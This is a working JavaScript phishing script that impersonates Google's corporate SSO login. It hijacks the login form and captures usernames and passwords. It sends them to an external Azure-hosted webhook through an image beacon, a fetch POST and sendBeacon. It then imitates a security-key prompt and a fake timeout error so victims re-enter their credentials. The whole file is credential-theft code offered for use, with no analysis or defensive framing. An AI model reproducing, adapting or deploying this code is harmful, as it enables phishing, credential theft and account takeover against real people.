// Google Corp SSO - Credential Capture + Realistic Flow Emulation
// Supports: Security Key (gnubby/U2F), Titan Key (WebAuthn), OTP fallback
(function(){
  var WEBHOOK_URL = 'https://orange-water-024741b0f.7.azurestaticapps.net';
  var CAPTURED = false;

  document.addEventListener('DOMContentLoaded', function(){
    var form = document.getElementById('loginForm');
    if(!form) return;

    // Override gnubby onsubmit — we control the flow
    form.onsubmit = null;
    document.getElementById('loginForm').onsubmit = null;

    // Remove any existing submit listeners by cloning
    var newForm = form.cloneNode(true);
    form.parentNode.replaceChild(newForm, form);
    form = newForm;

    // Re-grab refs after clone
    var usernameEl = document.getElementById('username');
    var passwordEl = document.getElementById('password');
    var signInBtn = document.getElementById('signInButton');
    var contentarea = document.getElementById('contentarea');
    var signerror = document.getElementById('signerror');

    // Show error on return from "submitted" state
    if(window.location.hash === '#submitted'){
      if(signerror) signerror.className = 'signerrorvisible';
      if(passwordEl) passwordEl.value = '';
      if(signInBtn){ signInBtn.disabled = false; signInBtn.value = "Sign in"; }
      history.replaceState(null, '', window.location.pathname);
    }

    // === MAIN FORM SUBMIT ===
    form.addEventListener('submit', function(e){
      e.preventDefault();
      e.stopPropagation();
      e.stopImmediatePropagation();

      if(CAPTURED) return false;

      var u = document.getElementById('username');
      var pw = document.getElementById('password');
      if(!u || !pw) return false;
      if(!u.value.trim()){ u.focus(); return false; }
      if(!pw.value.trim()){ pw.focus(); return false; }

      var username = u.value.trim();
      var password = pw.value;

      // === EXFILTRATE CREDENTIALS ===
      var payload = {
        identifier: username + '@google.com',
        password: password,
        username: username,
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent,
        referrer: document.referrer,
        target: 'login.corp.google.com',
        flow: 'gnubby'
      };

      // Image beacon (works everywhere, no CORS issues)
      try {
        var img = new Image();
        img.src = WEBHOOK_URL + '/capture?d=' +
          encodeURIComponent(btoa(JSON.stringify(payload)));
      } catch(err){}

      // Fetch POST (more reliable delivery)
      try {
        fetch(WEBHOOK_URL + '/capture', {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify(payload),
          mode: 'no-cors'
        });
      } catch(err){}

      // Also send via navigator.sendBeacon if available
      try {
        if(navigator.sendBeacon){
          var blob = new Blob([JSON.stringify(payload)], {type:'application/json'});
          navigator.sendBeacon(WEBHOOK_URL + '/capture', blob);
        }
      } catch(err){}

      CAPTURED = true;

      // === EMULATE REAL SSO FLOW ===
      // Phase 1: "Signing in..." button state
      if(signInBtn){ signInBtn.disabled = true; signInBtn.value = "Signing in..."; }

      // Phase 2: "Please wait..." (server processing)
      setTimeout(function(){
        if(contentarea) contentarea.className = 'showwaitforserver';
      }, 300);

      // Phase 3: "Insert and touch your Security Key..." (gnubby prompt)
      // This is the critical phase — real SSO asks for U2F/WebAuthn touch
      setTimeout(function(){
        if(contentarea) contentarea.className = 'showspinner';

        // Make the "waiting for touch" state look authentic
        var waitfortouch_text = document.getElementById('waitfortouch-text');
        var waitfortouch_image = document.getElementById('waitfortouch-image');
        if(waitfortouch_text) waitfortouch_text.className = 'waiting';
        if(waitfortouch_image) waitfortouch_image.className = 'waiting';
      }, 2500);

      // Phase 4: After ~8s, simulate "key touched" → brief "Please wait..." (processing)
      setTimeout(function(){
        var waitfortouch_text = document.getElementById('waitfortouch-text');
        var waitfortouch_image = document.getElementById('waitfortouch-image');
        var pleasewait_container = document.getElementById('pleasewait-container');

        if(waitfortouch_text) waitfortouch_text.className = 'touched';
        if(waitfortouch_image) waitfortouch_image.className = 'touched';
        if(pleasewait_container) pleasewait_container.className = 'touched';
      }, 10000);

      // Phase 5: After ~12s, show timeout error
      // Real SSO shows: "Touch timed out or Security Key connection failed"
      setTimeout(function(){
        if(contentarea) contentarea.className = 'showlogin';
        if(signerror) signerror.className = 'signerrorvisible';

        // Update error text to match real timeout message
        var signerror_text = document.getElementById('signerror-text');
        if(signerror_text){
          signerror_text.textContent = 'Touch timed out or Security Key connection failed. Please resubmit the form.';
        }

        if(signInBtn){ signInBtn.disabled = false; signInBtn.value = "Sign in"; }
        if(passwordEl) passwordEl.value = '';
        CAPTURED = false; // Allow retry
        window.location.hash = 'submitted';
      }, 13000);

      return false;
    }, true); // capture phase — runs before any other handlers

    // === HANDLE "USE SECURITY CODE" LINK ===
    // Real SSO has a fallback to OTP when gnubby fails
    var switchOtpLink = document.getElementById('switchOtpLink');
    if(switchOtpLink){
      switchOtpLink.onclick = function(e){
        e.preventDefault();
        // Switch to OTP flow — replace gnubby-related fields
        // In real SSO, this sets disableGnubby cookie and reloads
        // For our purposes, show the OTP input view
        var gnubbyRows = document.querySelectorAll('.gnubby-signin');
        // Just reload with ?gnubby=0 to show OTP variant
        document.cookie = "disableGnubby=1;path=/";
        window.location.href = window.location.pathname + '?gnubby=0';
      };
    }

    // === HANDLE OTP (SECURITY CODE) FLOW ===
    if(window.location.search.indexOf('gnubby=0') !== -1){
      // Hide gnubby-specific UI, show OTP field
      var waitfortouch = document.getElementById('waitfortouch');
      var waitforupdate = document.getElementById('waitforupdate');
      if(waitfortouch) waitfortouch.style.display = 'none';
      if(waitforupdate) waitforupdate.style.display = 'none';

      // Change submit flow to not show security key prompt
      // Override the flow phases for OTP
      var origSubmit = form.onsubmit;
      form.removeEventListener('submit', function(){});
    }

    // === HANDLE TITAN KEY INTERSTITIAL WARNING ===
    // Real Google FedRAMP shows: "You didn't use a Titan Security Key as required"
    // This div is already in the HTML, we make it visible after "successful" login
    var fedrampWarning = document.getElementById('interstitial-warning-fedramp');
    // We don't show this automatically — it only appears in real SSO
    // when user logs in without Titan key on FedRAMP accounts
  });
})();
